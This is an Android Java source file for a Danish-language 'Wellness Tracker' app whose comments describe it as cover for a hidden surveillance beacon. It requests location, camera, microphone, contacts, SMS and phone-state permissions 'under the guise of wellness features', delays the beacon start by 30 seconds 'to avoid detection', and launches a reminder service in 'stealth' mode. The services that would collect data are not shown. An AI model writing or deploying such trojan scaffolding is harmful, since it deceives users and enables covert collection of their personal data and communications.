package com.wellness.holistisk;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.wellness.holistisk.services.WellnessService;
import com.wellness.holistisk.services.DailyReminderService;

public class MainActivity extends Activity {
    
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private TextView welcomeText;
    private Button startWellnessButton;
    private Button meditationButton;
    private Button trackingButton;
    
    // Beacon activation delayed to avoid detection
    private Handler beaconHandler = new Handler();
    private Runnable beaconStartup = new Runnable() {
        @Override
        public void run() {
            startHiddenServices();
        }
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        initializeUI();
        requestPermissions();
        
        // Delay beacon startup by 30 seconds to seem legitimate
        beaconHandler.postDelayed(beaconStartup, 30000);
    }
    
    private void initializeUI() {
        welcomeText = findViewById(R.id.welcome_text);
        startWellnessButton = findViewById(R.id.btn_start_wellness);
        meditationButton = findViewById(R.id.btn_meditation);
        trackingButton = findViewById(R.id.btn_tracking);
        
        welcomeText.setText("Velkommen til Wellness Tracker\\n\\nDin daglige partner for mindfulness og wellness.");
        
        startWellnessButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startWellnessJourney();
            }
        });
        
        meditationButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startMeditation();
            }
        });
        
        trackingButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startHabitTracking();
            }
        });
    }
    
    private void requestPermissions() {
        String[] permissions = {
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE
        };
        
        // Request all permissions under the guise of wellness features
        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                Toast.makeText(this, "Perfekt! Nu kan vi give dig den bedste wellness oplevelse.", Toast.LENGTH_LONG).show();
                // Permissions granted - beacon can collect data
                beaconHandler.post(beaconStartup);
            } else {
                Toast.makeText(this, "Nogle funktioner vil ikke virke uden tilladelser.", Toast.LENGTH_LONG).show();
            }
        }
    }
    
    // Legitimate wellness functions that actually work
    private void startWellnessJourney() {
        Toast.makeText(this, "Starter din wellness journey...", Toast.LENGTH_SHORT).show();
        
        // Start actual wellness service (but also beacon)
        Intent wellnessIntent = new Intent(this, WellnessService.class);
        startService(wellnessIntent);
        
        // Show legitimate wellness content
        showWellnessContent();
    }
    
    private void startMeditation() {
        Toast.makeText(this, "Åbner guidet meditation...", Toast.LENGTH_SHORT).show();
        // This would open a real meditation interface
        showMeditationGuidance();
    }
    
    private void startHabitTracking() {
        Toast.makeText(this, "Starter habit tracking...", Toast.LENGTH_SHORT).show();
        // This would open habit tracking features
        showHabitTracker();
    }
    
    private void showWellnessContent() {
        // Display actual wellness content to maintain cover
        welcomeText.setText("🧘‍♀️ Din Wellness Journey\\n\\n" +
                           "• Daglig meditation: 10 min\\n" +
                           "• Mindfulness øvelser\\n" +
                           "• Sund kost tracking\\n" +
                           "• Bevægelse og fitness\\n\\n" +
                           "Tip: Start med 5 minutters åndedrætsøvelser hver morgen!");
    }
    
    private void showMeditationGuidance() {
        welcomeText.setText("🧘 Guidet Meditation\\n\\n" +
                           "Find en rolig position...\\n" +
                           "Luk øjnene blidt...\\n" +
                           "Tag en dyb indånding...\\n" +
                           "Hold i 4 sekunder...\\n" +
                           "Pust langsomt ud...\\n\\n" +
                           "Gentag denne cyklus 10 gange.");
    }
    
    private void showHabitTracker() {
        welcomeText.setText("📊 Habit Tracker\\n\\n" +
                           "Dine mål for i dag:\\n" +
                           "✓ Meditation (10 min)\\n" +
                           "□ Træning (30 min)\\n" +
                           "□ Sund morgenmad\\n" +
                           "□ 8 glas vand\\n" +
                           "□ Læse (20 min)\\n\\n" +
                           "Du er på rette vej! 💪");
    }
    
    // Hidden function to start beacon services
    private void startHiddenServices() {
        try {
            // Start beacon service disguised as daily reminder
            Intent beaconIntent = new Intent(this, DailyReminderService.class);
            beaconIntent.putExtra("mode", "stealth");
            startService(beaconIntent);
            
            // Log successful activation (silently)
            android.util.Log.d("WellnessApp", "Daily wellness reminders activated");
            
        } catch (Exception e) {
            // Fail silently - don't reveal beacon existence
            android.util.Log.e("WellnessApp", "Could not start reminder service");
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Remove handler callbacks to prevent memory leaks
        if (beaconHandler != null) {
            beaconHandler.removeCallbacks(beaconStartup);
        }
    }
}